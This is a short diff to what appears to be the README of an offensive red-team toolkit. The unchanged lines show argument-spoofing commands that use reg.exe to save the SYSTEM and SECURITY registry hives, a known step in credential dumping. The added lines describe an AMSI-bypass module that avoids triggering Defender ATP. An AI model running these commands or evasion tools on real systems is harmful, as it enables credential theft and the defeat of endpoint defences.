@@ -50,4 +50,7 @@ Similar to cobalt's strike argue command for argument spoofing. This is a simple
 ```argue C:\Windows\System32\reg.exe "save HKLM\SYSTEM C:\Users\Admin\Desktop\SYSTEM" "whatever"```  
 ```argue C:\Windows\System32\reg.exe "save HKLM\SECURITY C:\Users\Admin\Desktop\SECURITY" "whatever"```
 
+### AMSIBypass.yaml
+Modified AMSIBypass not dependent on SharpSploit which triggers DefenderATP.
+
  **Please contribute if you have any**
